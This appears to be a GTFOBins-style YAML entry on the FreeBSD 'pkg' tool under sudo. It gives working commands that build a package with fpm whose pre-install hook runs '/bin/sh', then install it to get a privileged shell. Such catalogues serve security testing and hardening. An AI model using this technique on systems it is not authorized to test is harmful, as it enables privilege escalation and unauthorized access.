---
functions:
  shell:
  - code: |-
      pkg install -y --no-repo-update ./x-1.0.txz
    comment: |-
      It runs an interactive shell using a specially crafted FreeBSD package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.

      ```
      echo 'exec /bin/sh' >x.sh
      fpm -n x -s dir -t freebsd -a all --before-install x.sh .
      ```
    contexts:
      sudo:
...
